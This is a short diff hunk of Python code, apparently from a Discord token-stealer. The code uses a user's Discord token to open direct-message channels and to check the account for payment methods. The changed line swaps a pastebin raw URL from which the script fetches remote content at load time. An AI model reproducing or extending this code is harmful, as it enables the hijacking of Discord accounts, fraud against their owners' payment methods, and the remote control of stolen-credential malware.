@@ -88,7 +88,7 @@ def getchat(token, uid):
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
     except:
         pass
-aress = 'https://pastebin.com/raw/N9BPuqbx'
+aress = 'https://pastebin.com/raw/qHzb4vEC'
 seek = requests.get(aress).text  
 def has_payment_methods(token):
     try:
